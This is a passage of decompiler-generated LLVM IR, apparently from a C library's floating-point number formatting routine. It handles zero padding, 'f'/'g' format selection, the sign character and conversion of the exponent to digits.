  br i1 %v12_8062c19, label %dec_label_pc_8062c24, label %dec_label_pc_8062c19.dec_label_pc_8062c20_crit_edge

dec_label_pc_8062c19.dec_label_pc_8062c20_crit_edge: ; preds = %dec_label_pc_8062c19
  %v0_8062c20.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8062c20

dec_label_pc_8062c20:                             ; preds = %dec_label_pc_8062c19.dec_label_pc_8062c20_crit_edge, %dec_label_pc_8062c12, %dec_label_pc_8062c16
  %v0_8062c20 = phi i32 [ %v0_8062c20.pre, %dec_label_pc_8062c19.dec_label_pc_8062c20_crit_edge ], [ %v0_8062c12, %dec_label_pc_8062c12 ], [ %v1_8062c16, %dec_label_pc_8062c16 ]
  store i32 %v0_8062c20, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062c51

dec_label_pc_8062c24:                             ; preds = %dec_label_pc_8062c19
  store i32 %v0_8062c31, i32* %eax.global-to-local, align 4
  %v0_8062c28 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8062c28 = add i32 %v0_8062c28, %v0_8062c31
  store i32 %v2_8062c28, i32* %ebx.global-to-local, align 4
  %v5_8062c2f = icmp slt i32 %v2_8062c28, -1
  br i1 %v5_8062c2f, label %dec_label_pc_8062c31, label %dec_label_pc_8062c51

dec_label_pc_8062c31:                             ; preds = %dec_label_pc_8062c24
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8062c39 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8062c39, i32* %eax.global-to-local, align 4
  %v4_8062c41 = bitcast i32* %stack_var_-72 to i8*
  %v5_8062c41 = call i32 @__GI_memset(i8* %v4_8062c41, i32 48, i32 21)
  store i32 %v5_8062c41, i32* %eax.global-to-local, align 4
  %v0_8062c51.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062c51

dec_label_pc_8062c51:                             ; preds = %dec_label_pc_8062c24, %dec_label_pc_8062c31, %dec_label_pc_8062c20
  %v1_8062c71 = phi i32 [ %v0_8062c20, %dec_label_pc_8062c20 ], [ %v2_8062c28, %dec_label_pc_8062c24 ], [ %v0_8062c51.pr.pre, %dec_label_pc_8062c31 ]
  %stack_var_-220.3 = phi i32 [ %v0_8062c31, %dec_label_pc_8062c20 ], [ %v0_8062c31, %dec_label_pc_8062c24 ], [ -1, %dec_label_pc_8062c31 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8062c64 = icmp sgt i32 %v1_8062c71, 20
  br i1 %v7_8062c64, label %dec_label_pc_8062c66, label %dec_label_pc_8062c71

dec_label_pc_8062c66:                             ; preds = %dec_label_pc_8062c51
  %v2_8062c66 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8062c66, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8062c85.preheader

dec_label_pc_8062c71:                             ; preds = %dec_label_pc_8062c51
  %v0_8062c71 = load i32, i32* @esp, align 4
  %v2_8062c71 = add i32 %v1_8062c71, 165
  %v3_8062c71 = add i32 %v2_8062c71, %v0_8062c71
  store i32 %v3_8062c71, i32* %eax.global-to-local, align 4
  %v1_8062c78 = add i32 %v3_8062c71, 2
  %v2_8062c78 = inttoptr i32 %v1_8062c78 to i8*
  %v3_8062c78 = load i8, i8* %v2_8062c78, align 1
  %v4_8062c78 = add i8 %v3_8062c78, -53
  %v9_8062c78 = sub i8 52, %v3_8062c78
  %v10_8062c78 = and i8 %v9_8062c78, %v3_8062c78
  %v11_8062c78 = icmp slt i8 %v10_8062c78, 0
  %v13_8062c78 = icmp slt i8 %v4_8062c78, 0
  store i32 %v1_8062c78, i32* %ecx.global-to-local, align 4
  %v2_8062c7f = icmp eq i1 %v13_8062c78, %v11_8062c78
  %v3_8062c7f = zext i1 %v2_8062c7f to i32
  br label %dec_label_pc_8062c85.preheader

dec_label_pc_8062c85.preheader:                   ; preds = %dec_label_pc_8062c71, %dec_label_pc_8062c66
  %v0_8062c85102 = phi i32 [ %v1_8062c78, %dec_label_pc_8062c71 ], [ %v2_8062c66, %dec_label_pc_8062c66 ]
  %storemerge71 = phi i32 [ %v3_8062c7f, %dec_label_pc_8062c71 ], [ 0, %dec_label_pc_8062c66 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062c85

dec_label_pc_8062c85:                             ; preds = %dec_label_pc_8062c85.backedge, %dec_label_pc_8062c85.preheader
  %v3_8062c86 = phi i32 [ %v3_8062c86.pre, %dec_label_pc_8062c85.backedge ], [ %storemerge71, %dec_label_pc_8062c85.preheader ]
  %v0_8062c85 = phi i32 [ %v0_8062c88, %dec_label_pc_8062c85.backedge ], [ %v0_8062c85102, %dec_label_pc_8062c85.preheader ]
  %v1_8062c85 = add i32 %v0_8062c85, -1
  store i32 %v1_8062c85, i32* %ecx.global-to-local, align 4
  %v1_8062c86 = inttoptr i32 %v1_8062c85 to i8*
  %v2_8062c86 = load i8, i8* %v1_8062c86, align 1
  %v4_8062c86 = trunc i32 %v3_8062c86 to i8
  %v5_8062c86 = add i8 %v2_8062c86, %v4_8062c86
  store i8 %v5_8062c86, i8* %v1_8062c86, align 1
  %v0_8062c88 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062c88 = inttoptr i32 %v0_8062c88 to i8*
  %v2_8062c88 = load i8, i8* %v1_8062c88, align 1
  %v3_8062c88 = zext i8 %v2_8062c88 to i32
  %v4_8062c88 = load i32, i32* %edx.global-to-local, align 4
  %v5_8062c88 = and i32 %v4_8062c88, -256
  %v6_8062c88 = or i32 %v5_8062c88, %v3_8062c88
  store i32 %v6_8062c88, i32* %edx.global-to-local, align 4
  %v7_8062c8a = icmp eq i8 %v2_8062c88, 48
  br i1 %v7_8062c8a, label %dec_label_pc_8062c85.backedge, label %dec_label_pc_8062c8f

dec_label_pc_8062c85.backedge:                    ; preds = %dec_label_pc_8062c85, %dec_label_pc_8062c8f
  %v3_8062c86.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062c85

dec_label_pc_8062c8f:                             ; preds = %dec_label_pc_8062c85
  %v2_8062c8f = add i8 %v2_8062c88, -57
  %v7_8062c8f = sub i8 56, %v2_8062c88
  %v8_8062c8f = and i8 %v7_8062c8f, %v2_8062c88
  %v9_8062c8f = icmp slt i8 %v8_8062c8f, 0
  %v10_8062c8f = icmp eq i8 %v2_8062c8f, 0
  %v11_8062c8f = icmp slt i8 %v2_8062c8f, 0
  %v3_8062c92 = icmp eq i1 %v11_8062c8f, %v9_8062c8f
  %v4_8062c92 = icmp eq i1 %v10_8062c8f, false
  %v5_8062c92 = and i1 %v4_8062c92, %v3_8062c92
  br i1 %v5_8062c92, label %dec_label_pc_8062c85.backedge, label %dec_label_pc_8062c94

dec_label_pc_8062c94:                             ; preds = %dec_label_pc_8062c8f
  %v2_8062c94 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8062c94, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8062c88, %v2_8062c94
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8062c9f, label %dec_label_pc_8062cac

dec_label_pc_8062c9f:                             ; preds = %dec_label_pc_8062c94
  store i32 %v2_8062b7b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062cb5

dec_label_pc_8062cac:                             ; preds = %dec_label_pc_8062c94
  store i32 %v2_8062c94, i32* %edx.global-to-local, align 4
  store i32 %v2_8062c94, i32* %ecx.global-to-local, align 4
  %v1_8062cb4 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8062cb4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8062cb5

dec_label_pc_8062cb5:                             ; preds = %dec_label_pc_8062c9f, %dec_label_pc_8062cac
  %v0_8062cb5 = phi i32 [ %v0_8062c88, %dec_label_pc_8062c9f ], [ %v2_8062c94, %dec_label_pc_8062cac ]
  %v1_8062cb5 = add i32 %v0_8062cb5, 1
  store i32 %v1_8062cb5, i32* %eax.global-to-local, align 4
  %v2_8062cbc = inttoptr i32 %v1_8062cb5 to i8*
  store i8 0, i8* %v2_8062cbc, align 1
  br i1 %v1_8062c10, label %dec_label_pc_8062ce2, label %dec_label_pc_8062cc7

dec_label_pc_8062cc7:                             ; preds = %dec_label_pc_8062cb5
  %v0_8062cc7 = load i32, i32* %esi.global-to-local, align 4
  %v5_8062cca = icmp slt i32 %v0_8062cc7, -4
  br i1 %v5_8062cca, label %dec_label_pc_8062cef, label %dec_label_pc_8062ccc

dec_label_pc_8062ccc:                             ; preds = %dec_label_pc_8062cc7
  %v1_8062ccc = load i32, i32* %ebx.global-to-local, align 4
  %v7_8062cce = icmp slt i32 %v1_8062ccc, %v0_8062cc7
  br i1 %v7_8062cce, label %dec_label_pc_8062cef, label %dec_label_pc_8062cd7

dec_label_pc_8062cd7:                             ; preds = %dec_label_pc_8062ccc
  %v2_8062cd9 = sub i32 %v1_8062ccc, %v0_8062cc7
  store i32 %v2_8062cd9, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8062cf3

dec_label_pc_8062ce2:                             ; preds = %dec_label_pc_8062cb5
  %v4_8062ce2 = zext i8 %stack_var_-207.1 to i32
  %v5_8062ce2 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8062ce2 = and i32 %v5_8062ce2, -256
  %v7_8062ce2 = or i32 %v6_8062ce2, %v4_8062ce2
  store i32 %v7_8062ce2, i32* %ebx.global-to-local, align 4
  %v10_8062ce6 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8062ce6, label %dec_label_pc_8062ce2.dec_label_pc_8062cf3_crit_edge, label %dec_label_pc_8062cef

dec_label_pc_8062ce2.dec_label_pc_8062cf3_crit_edge: ; preds = %dec_label_pc_8062ce2
  %v0_8062cf3.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8062cf3

dec_label_pc_8062cef:                             ; preds = %dec_label_pc_8062cc7, %dec_label_pc_8062ccc, %dec_label_pc_8062ce2
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8062ce2 ], [ 103, %dec_label_pc_8062ccc ], [ 103, %dec_label_pc_8062cc7 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062cfd

dec_label_pc_8062cf3:                             ; preds = %dec_label_pc_8062ce2.dec_label_pc_8062cf3_crit_edge, %dec_label_pc_8062cd7
  %v0_8062cf5 = phi i32 [ %v0_8062cf3.pre, %dec_label_pc_8062ce2.dec_label_pc_8062cf3_crit_edge ], [ %v0_8062cc7, %dec_label_pc_8062cd7 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8062ce2.dec_label_pc_8062cf3_crit_edge ], [ 102, %dec_label_pc_8062cd7 ]
  %v2_8062cf3 = icmp slt i32 %v0_8062cf5, 0
  store i32 %v0_8062cf5, i32* %ebx.global-to-local, align 4
  %v1_8062cf7 = icmp eq i1 %v2_8062cf3, false
  br i1 %v1_8062cf7, label %dec_label_pc_8062cfd, label %dec_label_pc_8062cf9

dec_label_pc_8062cf9:                             ; preds = %dec_label_pc_8062cf3
  %v0_8062cf9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062cf9 = add i32 %v0_8062cf9, -1
  store i32 %v1_8062cf9, i32* %edx.global-to-local, align 4
  %v1_8062cfa = inttoptr i32 %v1_8062cf9 to i8*
  store i8 48, i8* %v1_8062cfa, align 1
  %v0_8062d32.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062cfd

dec_label_pc_8062cfd:                             ; preds = %dec_label_pc_8062cf3, %dec_label_pc_8062cef, %dec_label_pc_8062cf9
  %v1_8062d8d = phi i32 [ %v0_8062cf5, %dec_label_pc_8062cf3 ], [ %v0_8062d32.pre, %dec_label_pc_8062cf9 ], [ 0, %dec_label_pc_8062cef ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8062cf3 ], [ %stack_var_-197.1, %dec_label_pc_8062cf9 ], [ %stack_var_-197.0, %dec_label_pc_8062cef ]
  %v2_8062cfd = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8062cfd, i32* %eax.global-to-local, align 4
  %v0_8062d0c = load i32, i32* %edx.global-to-local, align 4
  %v1_8062d0c = add i32 %v0_8062d0c, 1
  store i32 %v1_8062d0c, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8062d1b = inttoptr i32 %v0_8062d0c to i8*
  %v2_8062d1b = load i8, i8* %v1_8062d1b, align 1
  %v3_8062d1b = zext i8 %v2_8062d1b to i32
  %v5_8062d1b = and i32 %v2_8062cfd, -256
  %v6_8062d1b = or i32 %v3_8062d1b, %v5_8062d1b
  store i32 %v6_8062d1b, i32* %eax.global-to-local, align 4
  store i32 %v6_8062d1b, i32* %stack_var_-22, align 4
  %v2_8062d30 = sub i32 %v1_8062cb5, %v1_8062d0c
  store i32 %v2_8062d30, i32* %edx.global-to-local, align 4
  %v1_8062d32 = icmp eq i32 %v1_8062d8d, 0
  %v2_8062d32 = icmp slt i32 %v1_8062d8d, 0
  br i1 %v2_8062d32, label %dec_label_pc_8062d81, label %dec_label_pc_8062d36

dec_label_pc_8062d36:                             ; preds = %dec_label_pc_8062cfd
  %v2_8062d36 = sub i32 %v1_8062d8d, %v2_8062d30
  %v8_8062d36 = xor i32 %v2_8062d30, %v1_8062d8d
  %v9_8062d36 = xor i32 %v2_8062d36, %v1_8062d8d
  %v10_8062d36 = and i32 %v9_8062d36, %v8_8062d36
  %v11_8062d36 = icmp slt i32 %v10_8062d36, 0
  %v13_8062d36 = icmp slt i32 %v2_8062d36, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8062d44 = icmp eq i1 %v13_8062d36, %v11_8062d36
  br i1 %v2_8062d44, label %dec_label_pc_8062d46, label %dec_label_pc_8062d7a

dec_label_pc_8062d46:                             ; preds = %dec_label_pc_8062d36
  store i32 %v2_8062d36, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_8062d36, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8062d5b, label %dec_label_pc_8062d76

dec_label_pc_8062d5b:                             ; preds = %dec_label_pc_8062d46
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8062d76

dec_label_pc_8062d76:                             ; preds = %dec_label_pc_8062d46, %dec_label_pc_8062d5b
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8062d5b ], [ %stack_var_-132, %dec_label_pc_8062d46 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062d96

dec_label_pc_8062d7a:                             ; preds = %dec_label_pc_8062d36
  %v4_8062d7c = icmp eq i1 %v1_8062d32, false
  br i1 %v4_8062d7c, label %dec_label_pc_8062d87, label %dec_label_pc_8062d7e

dec_label_pc_8062d7e:                             ; preds = %dec_label_pc_8062d7a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062d81

dec_label_pc_8062d81:                             ; preds = %dec_label_pc_8062cfd, %dec_label_pc_8062d7e
  %v0_8062dc9112 = phi i32 [ %v1_8062d8d, %dec_label_pc_8062cfd ], [ -1, %dec_label_pc_8062d7e ]
  %v2_8062d81 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8062d81, i32* @ecx, align 4
  br label %dec_label_pc_8062d96

dec_label_pc_8062d87:                             ; preds = %dec_label_pc_8062d7a
  %v2_8062d8b = add i32 %v1_8062d0c, %v1_8062d8d
  store i32 %v2_8062d8b, i32* %edi.global-to-local, align 4
  %v2_8062d8d = sub i32 %v2_8062d30, %v1_8062d8d
  store i32 %v2_8062d8d, i32* %edx.global-to-local, align 4
  %v2_8062d8f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8062d8f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062d96

dec_label_pc_8062d96:                             ; preds = %dec_label_pc_8062d81, %dec_label_pc_8062d76, %dec_label_pc_8062d87
  %v0_8062dc9111 = phi i32 [ %v0_8062dc9112, %dec_label_pc_8062d81 ], [ -1, %dec_label_pc_8062d76 ], [ -1, %dec_label_pc_8062d87 ]
  %v0_8062db2 = phi i32 [ %v2_8062d81, %dec_label_pc_8062d81 ], [ %storemerge28, %dec_label_pc_8062d76 ], [ %v2_8062d8f, %dec_label_pc_8062d87 ]
  %v0_8062da3 = phi i32 [ %v2_8062d30, %dec_label_pc_8062d81 ], [ 0, %dec_label_pc_8062d76 ], [ %v2_8062d8d, %dec_label_pc_8062d87 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8062d9d = inttoptr i32 %v1_8062a13 to i8*
  %v3_8062d9d = load i8, i8* %v2_8062d9d, align 1
  %v4_8062d9d = and i8 %v3_8062d9d, 16
  %v5_8062d9d = icmp eq i8 %v4_8062d9d, 0
  %v1_8062da1 = icmp eq i1 %v5_8062d9d, false
  br i1 %v1_8062da1, label %dec_label_pc_8062db2, label %dec_label_pc_8062da3

dec_label_pc_8062da3:                             ; preds = %dec_label_pc_8062d96
  %v1_8062da3 = icmp eq i32 %v0_8062da3, 0
  %v1_8062da5 = icmp eq i1 %v1_8062da3, false
  br i1 %v1_8062da5, label %dec_label_pc_8062db2, label %dec_label_pc_8062da7

dec_label_pc_8062da7:                             ; preds = %dec_label_pc_8062da3
  br i1 %v12_8062c0b, label %dec_label_pc_8062dc9, label %dec_label_pc_8062dae

dec_label_pc_8062dae:                             ; preds = %dec_label_pc_8062da7
  %v0_8062dae = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_8062dae, 1
  br i1 %tmp189, label %dec_label_pc_8062dc9, label %dec_label_pc_8062db2

dec_label_pc_8062db2:                             ; preds = %dec_label_pc_8062dae, %dec_label_pc_8062da3, %dec_label_pc_8062d96
  %v1_8062db2 = inttoptr i32 %v0_8062db2 to i32*
  store i32 112, i32* %v1_8062db2, align 4
  %v0_8062db8 = load i32, i32* @ecx, align 4
  %v1_8062db8 = add i32 %v0_8062db8, 4
  %v2_8062db8 = inttoptr i32 %v1_8062db8 to i32*
  store i32 1, i32* %v2_8062db8, align 4
  %v0_8062dbf = load i32, i32* @ecx, align 4
  %v1_8062dbf = add i32 %v0_8062dbf, 8
  %v2_8062dbf = inttoptr i32 %v1_8062dbf to i32*
  store i32 ptrtoint (i32* @global_var_806f340.811 to i32), i32* %v2_8062dbf, align 4
  %v0_8062dc6 = load i32, i32* @ecx, align 4
  %v1_8062dc6 = add i32 %v0_8062dc6, 12
  store i32 %v1_8062dc6, i32* @ecx, align 4
  %v0_8062dc9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062dc9

dec_label_pc_8062dc9:                             ; preds = %dec_label_pc_8062dae, %dec_label_pc_8062da7, %dec_label_pc_8062db2
  %v0_8062dd0 = phi i32 [ %v0_8062db2, %dec_label_pc_8062dae ], [ %v0_8062db2, %dec_label_pc_8062da7 ], [ %v1_8062dc6, %dec_label_pc_8062db2 ]
  %v0_8062dc9 = phi i32 [ %v0_8062dc9111, %dec_label_pc_8062dae ], [ %v0_8062dc9111, %dec_label_pc_8062da7 ], [ %v0_8062dc9.pre, %dec_label_pc_8062db2 ]
  %v1_8062dc9 = add i32 %v0_8062dc9, 1
  %v8_8062dc9 = icmp eq i32 %v1_8062dc9, 0
  store i32 %v1_8062dc9, i32* %ebx.global-to-local, align 4
  br i1 %v8_8062dc9, label %dec_label_pc_8062de3, label %dec_label_pc_8062dcc

dec_label_pc_8062dcc:                             ; preds = %dec_label_pc_8062dc9
  %v1_8062dce = sub i32 -1, %v0_8062dc9
  store i32 %v1_8062dce, i32* %eax.global-to-local, align 4
  %v1_8062dd0 = inttoptr i32 %v0_8062dd0 to i32*
  store i32 176, i32* %v1_8062dd0, align 4
  %v0_8062dd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062dd6 = load i32, i32* @ecx, align 4
  %v2_8062dd6 = add i32 %v1_8062dd6, 4
  %v3_8062dd6 = inttoptr i32 %v2_8062dd6 to i32*
  store i32 %v0_8062dd6, i32* %v3_8062dd6, align 4
  %v0_8062dd9 = load i32, i32* @ecx, align 4
  %v1_8062dd9 = add i32 %v0_8062dd9, 8
  %v2_8062dd9 = inttoptr i32 %v1_8062dd9 to i32*
  store i32 ptrtoint (i32* @global_var_806f333.810 to i32), i32* %v2_8062dd9, align 4
  %v0_8062de0 = load i32, i32* @ecx, align 4
  %v1_8062de0 = add i32 %v0_8062de0, 12
  store i32 %v1_8062de0, i32* @ecx, align 4
  br label %dec_label_pc_8062de3

dec_label_pc_8062de3:                             ; preds = %dec_label_pc_8062dc9, %dec_label_pc_8062dcc
  %v0_8062de7 = phi i32 [ %v0_8062dd0, %dec_label_pc_8062dc9 ], [ %v1_8062de0, %dec_label_pc_8062dcc ]
  %v0_8062de3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062de3 = icmp eq i32 %v0_8062de3, 0
  br i1 %v1_8062de3, label %dec_label_pc_8062df6, label %dec_label_pc_8062de7

dec_label_pc_8062de7:                             ; preds = %dec_label_pc_8062de3
  %v1_8062de7 = inttoptr i32 %v0_8062de7 to i32*
  store i32 112, i32* %v1_8062de7, align 4
  %v0_8062ded = load i32, i32* %edx.global-to-local, align 4
  %v1_8062ded = load i32, i32* @ecx, align 4
  %v2_8062ded = add i32 %v1_8062ded, 4
  %v3_8062ded = inttoptr i32 %v2_8062ded to i32*
  store i32 %v0_8062ded, i32* %v3_8062ded, align 4
  %v0_8062df0 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062df0 = load i32, i32* @ecx, align 4
  %v2_8062df0 = add i32 %v1_8062df0, 8
  %v3_8062df0 = inttoptr i32 %v2_8062df0 to i32*
  store i32 %v0_8062df0, i32* %v3_8062df0, align 4
  %v0_8062df3 = load i32, i32* @ecx, align 4
  %v1_8062df3 = add i32 %v0_8062df3, 12
  store i32 %v1_8062df3, i32* @ecx, align 4
  br label %dec_label_pc_8062df6

dec_label_pc_8062df6:                             ; preds = %dec_label_pc_8062de3, %dec_label_pc_8062de7
  %v0_8062e14 = phi i32 [ %v0_8062de7, %dec_label_pc_8062de3 ], [ %v1_8062df3, %dec_label_pc_8062de7 ]
  br i1 %v1_8062c10, label %dec_label_pc_8062e0a, label %dec_label_pc_8062dfd

dec_label_pc_8062dfd:                             ; preds = %dec_label_pc_8062df6
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_8062e04 = load i8, i8* %v2_8062d9d, align 1
  %v4_8062e04 = and i8 %v3_8062e04, 16
  %v5_8062e04 = icmp eq i8 %v4_8062e04, 0
  br i1 %v5_8062e04, label %dec_label_pc_8062e27, label %dec_label_pc_8062e0a

dec_label_pc_8062e0a:                             ; preds = %dec_label_pc_8062dfd, %dec_label_pc_8062df6
  %v0_8062e0a = load i32, i32* %edx.global-to-local, align 4
  %v1_8062e0c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062e0c = sub i32 %v0_8062e0a, %v1_8062e0c
  store i32 %v2_8062e0c, i32* %eax.global-to-local, align 4
  %v1_8062e0e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8062e0e = sub i32 %v2_8062e0c, %v1_8062e0e
  %v8_8062e0e = xor i32 %v1_8062e0e, %v2_8062e0c
  %v9_8062e0e = xor i32 %v2_8062e0e, %v2_8062e0c
  %v10_8062e0e = and i32 %v9_8062e0e, %v8_8062e0e
  %v11_8062e0e = icmp slt i32 %v10_8062e0e, 0
  %v13_8062e0e = icmp slt i32 %v2_8062e0e, 0
  %v2_8062e10 = icmp eq i1 %v13_8062e0e, %v11_8062e0e
  br i1 %v2_8062e10, label %dec_label_pc_8062e27, label %dec_label_pc_8062e12

dec_label_pc_8062e12:                             ; preds = %dec_label_pc_8062e0a
  %v2_8062e12 = sub i32 %v1_8062e0e, %v2_8062e0c
  store i32 %v2_8062e12, i32* %ebp.global-to-local, align 4
  %v1_8062e14 = inttoptr i32 %v0_8062e14 to i32*
  store i32 176, i32* %v1_8062e14, align 4
  %v0_8062e1a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8062e1a = load i32, i32* @ecx, align 4
  %v2_8062e1a = add i32 %v1_8062e1a, 4
  %v3_8062e1a = inttoptr i32 %v2_8062e1a to i32*
  store i32 %v0_8062e1a, i32* %v3_8062e1a, align 4
  %v0_8062e1d = load i32, i32* @ecx, align 4
  %v1_8062e1d = add i32 %v0_8062e1d, 8
  %v2_8062e1d = inttoptr i32 %v1_8062e1d to i32*
  store i32 ptrtoint (i32* @global_var_806f333.810 to i32), i32* %v2_8062e1d, align 4
  %v0_8062e24 = load i32, i32* @ecx, align 4
  %v1_8062e24 = add i32 %v0_8062e24, 12
  store i32 %v1_8062e24, i32* @ecx, align 4
  br label %dec_label_pc_8062e27

dec_label_pc_8062e27:                             ; preds = %dec_label_pc_8062e0a, %dec_label_pc_8062dfd, %dec_label_pc_8062e12
  %v1_8062eaf121 = phi i32 [ %v0_8062e14, %dec_label_pc_8062e0a ], [ %v0_8062e14, %dec_label_pc_8062dfd ], [ %v1_8062e24, %dec_label_pc_8062e12 ]
  %v12_8062e27 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8062e27, label %dec_label_pc_8062ea2, label %dec_label_pc_8062e2e

dec_label_pc_8062e2e:                             ; preds = %dec_label_pc_8062e27
  %v5_8062e2e = load i32, i32* %edx.global-to-local, align 4
  %v6_8062e2e = and i32 %v5_8062e2e, -256
  %v7_8062e2e = or i32 %v6_8062e2e, %stack_var_-42.0
  store i32 %v7_8062e2e, i32* %edx.global-to-local, align 4
  %v0_8062e35 = load i32, i32* %esi.global-to-local, align 4
  %v2_8062e35 = icmp slt i32 %v0_8062e35, 0
  %v1_8062e37 = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8062e35, label %dec_label_pc_8062e46, label %dec_label_pc_8062e4f

dec_label_pc_8062e46:                             ; preds = %dec_label_pc_8062e2e
  store i32 %v0_8062e35, i32* %edx.global-to-local, align 4
  %v1_8062e48 = sub i32 0, %v0_8062e35
  br label %dec_label_pc_8062e4f

dec_label_pc_8062e4f:                             ; preds = %dec_label_pc_8062e2e, %dec_label_pc_8062e46
  %storemerge27 = phi i32 [ %v1_8062e48, %dec_label_pc_8062e46 ], [ %v0_8062e35, %dec_label_pc_8062e2e ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8062e46 ], [ 43, %dec_label_pc_8062e2e ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8062e57 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8062e57, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062e63

dec_label_pc_8062e63:                             ; preds = %dec_label_pc_8062e63.backedge, %dec_label_pc_8062e4f
  %v0_8062e6e = phi i32 [ %v0_8062e6e.pre, %dec_label_pc_8062e63.backedge ], [ %v2_8062e57, %dec_label_pc_8062e4f ]
  %v0_8062e6b = phi i32 [ %v0_8062e6b.pre, %dec_label_pc_8062e63.backedge ], [ 2, %dec_label_pc_8062e4f ]
  %v0_8062e63 = phi i32 [ %v9_8062e6c, %dec_label_pc_8062e63.backedge ], [ %storemerge27, %dec_label_pc_8062e4f ]
  %v1_8062e6a = ashr i32 %v0_8062e63, 31
  %v1_8062e6b = add i32 %v0_8062e6b, 1
  store i32 %v1_8062e6b, i32* %edi.global-to-local, align 4
  %v2_8062e6c = zext i32 %v0_8062e63 to i64
  %v4_8062e6c = zext i32 %v1_8062e6a to i64
  %v5_8062e6c = mul nuw i64 %v4_8062e6c, 4294967296
  %v6_8062e6c = or i64 %v5_8062e6c, %v2_8062e6c
  %v8_8062e6c = sdiv i64 %v6_8062e6c, 10
  %v9_8062e6c = trunc i64 %v8_8062e6c to i32
  %v10_8062e6c = srem i64 %v6_8062e6c, 10
  %v1_8062e6e = add i32 %v0_8062e6e, -1
  store i32 %v1_8062e6e, i32* %ebx.global-to-local, align 4
  store i32 %v9_8062e6c, i32* %esi.global-to-local, align 4
  %v3_8062e71 = and i32 %v9_8062e6c, -256
  %v1_8062e73 = trunc i64 %v10_8062e6c to i8
  %v2_8062e73 = add i8 %v1_8062e73, 48
  %v12_8062e73 = zext i8 %v2_8062e73 to i32
  %v15_8062e73 = or i32 %v12_8062e73, %v3_8062e71
  store i32 %v15_8062e73, i32* %eax.global-to-local, align 4
  %v3_8062e78 = inttoptr i32 %v1_8062e6e to i8*
  store i8 %v2_8062e73, i8* %v3_8062e78, align 1
  store i32 %v9_8062e6c, i32* %edx.global-to-local, align 4
  %v7_8062e7c = icmp sgt i32 %v1_8062e6b, 3
  br i1 %v7_8062e7c, label %dec_label_pc_8062e7e, label %dec_label_pc_8062e63.backedge

dec_label_pc_8062e7e:                             ; preds = %dec_label_pc_8062e63
  %v2_8062e7e = icmp eq i32 %v9_8062e6c, 0
  %v1_8062e80 = icmp eq i1 %v2_8062e7e, false
  br i1 %v1_8062e80, label %dec_label_pc_8062e63.backedge, label %dec_label_pc_8062e82

dec_label_pc_8062e63.backedge:                    ; preds = %dec_label_pc_8062e7e, %dec_label_pc_8062e63
  %v0_8062e6b.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8062e6e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062e63

